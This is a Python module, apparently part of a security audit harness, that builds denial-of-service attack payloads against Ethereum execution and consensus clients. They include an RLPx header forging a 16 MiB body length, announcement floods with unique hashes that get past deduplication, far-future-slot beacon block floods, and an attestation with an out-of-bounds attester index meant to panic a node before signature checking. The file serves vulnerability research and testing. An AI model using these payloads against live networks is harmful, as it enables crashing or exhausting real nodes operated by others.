"""Pure attack-payload builders — the construction half of each driver.

Sending needs a live devnet; *constructing* the malicious payload is pure and
testable offline. Splitting them lets us verify, with no network, that each
driver builds the exact regime the finding documents (entry counts, the forged
body-length field, far-future slot + unique graffiti, frame-size limits).

Grounded on the real attack_scenario fields in CONFIRMED_reth and on the SSZ
encoders in reports/grandine/poc/PROP-val-eth-003/poc.py.
"""

from __future__ import annotations

import hashlib
import struct
from dataclasses import dataclass

# devp2p RLPx / eth limits
RLPX_FRAME_HEADER_LEN = 32          # 16-byte header + 16-byte MAC
MAX_RLPX_FRAME_BYTES = 16 * 1024 * 1024  # EIP-706 max payload, 16 MiB
HASH_LEN = 32


@dataclass
class Payload:
    """A constructed attack payload (not yet sent)."""

    generator: str
    count: int                 # flood units this payload represents
    sent_bytes: int            # bytes the attacker puts on the wire
    victim_cost_bytes: int     # resource the victim is induced to reserve/hold
    artifact: bytes = b""      # a concrete sample (header / first entry / one block)
    unique_count: int = 0      # distinct items (dedup-bypass check)


def _unique_hash(seed: int) -> bytes:
    return hashlib.sha256(struct.pack("<Q", seed)).digest()[:HASH_LEN]


def _compressible_unique_txhash(seed: int) -> bytes:
    """A unique tx hash that compresses well under snappy.

    The live AUDIT-001 payload rides over a snappy-compressed eth session.
    Using structured hashes keeps the attack faithful while allowing much
    larger logical announcement counts to fit on the wire.
    """
    return struct.pack(">I", seed) + b"\x00" * 28


# --- p2p-rlpx: oversized frame body length (RETH-RLPX-002) ------------------

def build_rlpx_oversized_header(body_size: int = 0xFFFFFF, count: int = 1) -> Payload:
    """A 32-byte RLPx frame header declaring a 0xFFFFFF (16 MiB) body.

    The first 3 bytes of the header are the big-endian body length; the codec
    reserves that many bytes per connection while waiting for the body.
    """
    header = bytearray(RLPX_FRAME_HEADER_LEN)
    header[0:3] = body_size.to_bytes(3, "big")
    return Payload(
        generator="oversized_frame_body_length",
        count=count,
        sent_bytes=RLPX_FRAME_HEADER_LEN * count,   # the attacker only sends headers
        victim_cost_bytes=body_size * count,        # ~16 MiB reserved per session
        artifact=bytes(header),
        unique_count=count,
    )


# --- devp2p-wire: NewBlockHashes flood (RETH-WIRE-003) ----------------------

def build_newblockhashes(count: int, seed: int = 0) -> Payload:
    """A NewBlockHashes announcement of ``count`` unique (hash, number) entries."""
    entries = [(_unique_hash(seed + i), seed + i) for i in range(count)]
    per_entry = HASH_LEN + 8  # 32-byte hash + uint number (approx wire size)
    return Payload(
        generator="newblockhashes_flood",
        count=count,
        sent_bytes=per_entry * count,
        victim_cost_bytes=HASH_LEN * count,  # extends the per-peer announced set
        artifact=entries[0][0] if entries else b"",
        unique_count=len({h for h, _ in entries}),
    )


# --- txpool: NewPooledTransactionHashes flood (AUDIT-001) -------------------

def build_newpooledtxhashes(count: int) -> Payload:
    """``count`` unique 32-byte tx hashes, kept under the 16 MiB frame limit."""
    hashes = [_compressible_unique_txhash(i) for i in range(count)]
    sent = HASH_LEN * count
    return Payload(
        generator="newpooledtxhashes_hash_flood",
        count=count,
        sent_bytes=sent,
        victim_cost_bytes=0,  # 320-slot LRU is bounded; cost is CPU churn, not heap
        artifact=hashes[0] if hashes else b"",
        unique_count=len(set(hashes)),
    )


# --- block-import: unfinalized fork-block flood (RETH-BCT-001) --------------

def build_fork_blocks(count: int, per_item_bytes: int = 65536) -> Payload:
    """``count`` distinct fork blocks (unique body byte -> unique root).

    Fidelity note: represented by their distinct roots, not full SSZ blocks —
    enough to verify the dedup-bypass (unique roots) and the held-heap regime.
    """
    roots = [_unique_hash(0xF00D_0000 + i) for i in range(count)]
    return Payload(
        generator="unfinalized_fork_block_flood",
        count=count,
        sent_bytes=per_item_bytes * count,
        victim_cost_bytes=per_item_bytes * count,  # retained in TreeState maps
        artifact=roots[0] if roots else b"",
        unique_count=len(set(roots)),
    )


# --- p2p-gossip: far-future-slot BeaconBlock flood (PROP-val-eth-003) -------
# Minimal SSZ encoders ported from poc.py so the gossip payload is real.

def _uint64_le(n: int) -> bytes:
    return struct.pack("<Q", n)


def _uint32_le(n: int) -> bytes:
    return struct.pack("<I", n)


def _encode_beacon_block_body(graffiti: bytes) -> bytes:
    graffiti_padded = graffiti[:32].ljust(32, b"\x00")
    randao = b"\x00" * 96
    eth1 = b"\x00" * 32 + _uint64_le(0) + b"\x00" * 32  # 72
    fixed = 96 + 72 + 32
    offset_base = fixed + 7 * 4
    offsets = b"".join(_uint32_le(offset_base) for _ in range(7))
    return randao + eth1 + graffiti_padded + offsets


def _encode_signed_block(slot: int, graffiti: bytes) -> bytes:
    body = _encode_beacon_block_body(graffiti)
    body_offset = _uint32_le(84)
    block = _uint64_le(slot) + _uint64_le(0) + b"\x00" * 32 + b"\x00" * 32 + body_offset + body
    msg_offset = _uint32_le(100)
    return msg_offset + b"\x00" * 96 + block


def build_far_future_blocks(count: int, current_slot: int = 1000, slot_offset: int = 1_000_000) -> Payload:
    """``count`` SSZ SignedBeaconBlocks at a far-future slot, unique graffiti."""
    slot = current_slot + slot_offset
    blocks = [_encode_signed_block(slot, struct.pack("<I", i).ljust(32, b"\x00")) for i in range(count)]
    roots = {hashlib.sha256(b).digest() for b in blocks}  # unique payload -> bypasses dedup
    return Payload(
        generator="far_future_slot_beacon_block_flood",
        count=count,
        sent_bytes=sum(len(b) for b in blocks),
        victim_cost_bytes=sum(len(b) for b in blocks),  # buffered in delayed_until_slot
        artifact=blocks[0] if blocks else b"",
        unique_count=len(roots),
    )


# --- p2p-gossip: SingleAttestation OOB attester_index (CHK-QW-02) ------------
#
# Electra SingleAttestation SSZ layout (consensus-specs):
#   { attester_index: ValidatorIndex (u64),
#     data: AttestationData,
#     signature: BLSSignature (96 bytes) }
# AttestationData:
#   { slot: Slot (u64), index: CommitteeIndex (u64),
#     beacon_block_root: Root (32),
#     source: Checkpoint { epoch: u64, root: 32 },
#     target: Checkpoint { epoch: u64, root: 32 } }
# Total fixed: 8 + (8+8+32+8+32+8+32) + 96 = 8 + 128 + 96 = 232 bytes

ATTESTATION_DATA_SIZE = 128  # slot(8) + index(8) + root(32) + source(8+32) + target(8+32)
SINGLE_ATTESTATION_SIZE = 8 + ATTESTATION_DATA_SIZE + 96  # 232


def build_singleattestation_oob(
    *,
    attester_index: int = 0xFFFFFFFF,
    slot: int = 0,
    committee_index: int = 0,
    beacon_block_root: bytes = b"\x00" * 32,
    source_epoch: int = 0,
    source_root: bytes = b"\x00" * 32,
    target_epoch: int = 0,
    target_root: bytes = b"\x00" * 32,
) -> Payload:
    """A SingleAttestation with an out-of-band attester_index.

    The attester_index is set to a value that exceeds the justified state's
    validator registry length (the "post-justified-checkpoint validator" from
    the finding), so the victim's unguarded ``justified_active_balances[index]``
    panics with an out-of-bounds access. The signature is zeroed — grandine
    validates the BLS signature *after* the fork-choice mutator indexes the
    array, so the panic fires before the invalid signature is rejected.
    """
    data = (
        _uint64_le(slot)
        + _uint64_le(committee_index)
        + beacon_block_root
        + _uint64_le(source_epoch) + source_root
        + _uint64_le(target_epoch) + target_root
    )
    assert len(data) == ATTESTATION_DATA_SIZE
    signature = b"\x00" * 96
    msg = _uint64_le(attester_index) + data + signature
    assert len(msg) == SINGLE_ATTESTATION_SIZE
    return Payload(
        generator="singleattestation_oob_attester_index",
        count=1,
        sent_bytes=len(msg),
        victim_cost_bytes=len(msg),  # the cost is a panic, not heap growth
        artifact=msg,
        unique_count=1,
    )


# generator name -> builder(params) -> Payload
def build_payload(generator: str, params: dict) -> Payload:
    if generator == "oversized_frame_body_length":
        return build_rlpx_oversized_header(count=int(params.get("count", 1)))
    if generator == "newblockhashes_flood":
        # one message's worth of entries; per_item_bytes ~ entries*40
        entries = int(params.get("per_item_bytes", 8_000_000)) // 40
        return build_newblockhashes(entries)
    if generator == "newpooledtxhashes_hash_flood":
        return build_newpooledtxhashes(int(params.get("count", 500_000)))
    if generator == "unfinalized_fork_block_flood":
        return build_fork_blocks(
            int(params.get("count", 20_000)), int(params.get("per_item_bytes", 65536))
        )
    if generator == "far_future_slot_beacon_block_flood":
        # cap constructed blocks for a unit test; the real flood repeats this.
        n = min(int(params.get("count", 1000)), 1000)
        return build_far_future_blocks(n, slot_offset=int(params.get("slot_offset", 1_000_000)))
    if generator == "singleattestation_oob_attester_index":
        return build_singleattestation_oob(
            attester_index=int(params.get("attester_index", 0xFFFFFFFF)),
            slot=int(params.get("slot", 0)),
            committee_index=int(params.get("committee_index", 0)),
        )
    raise KeyError(f"no payload builder for generator {generator!r}")
